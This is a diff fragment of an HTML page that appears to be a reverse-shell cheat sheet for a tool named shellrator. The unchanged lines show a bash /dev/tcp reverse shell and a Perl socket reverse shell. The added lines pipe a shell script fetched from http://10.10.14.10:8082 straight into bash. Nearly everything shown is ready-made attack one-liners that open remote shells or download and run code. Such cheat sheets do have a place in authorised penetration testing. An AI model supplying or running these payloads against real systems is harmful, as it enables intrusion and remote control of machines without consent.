@@ -3530,6 +3530,10 @@ sudo cp shellrator.py /bin/shellrator
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
 </code></pre></div></div>
 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#remotely
+sh -c curl% http://10.10.14.10:8082/shell.sh|bash
+</code></pre></div></div>
+
 <h3 id="perl-1">Perl</h3>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="&lt;IP&gt;";$p=&lt;PORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
